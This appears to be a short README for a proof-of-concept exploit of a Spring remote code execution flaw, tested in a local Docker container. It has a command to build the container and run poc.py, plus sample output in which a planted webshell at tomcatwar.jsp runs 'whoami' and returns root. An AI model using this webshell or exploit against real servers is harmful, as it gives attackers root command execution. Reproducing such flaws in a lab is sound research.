Trial & error:
```sh
docker rm -f rce; docker build -t rce:latest . && docker run -d -p 8080:8080 --name rce rce:latest && sleep 5 && python poc.py
```

Output example:
```
rce
sha256:f626a2190dc0790c610afd4f12a4b2482b6a726d671fdac1432275de89c07cd6
1a048e5725f754d331de9491d0750c4c7a163472dea1fd1554edccfd00d7f6e5
deploy <Response [200]>
webshell <Response [404]>
webshell <Response [404]>
webshell <Response [404]>
webshell <Response [404]>
webshell <Response [500]>
webshell http://localhost:8080/tomcatwar.jsp?cmd=whoami
root
```

Sources:
  - https://twitter.com/vxunderground/status/1509170582469943303
  - https://github.com/fengguangbin/spring-rce-war
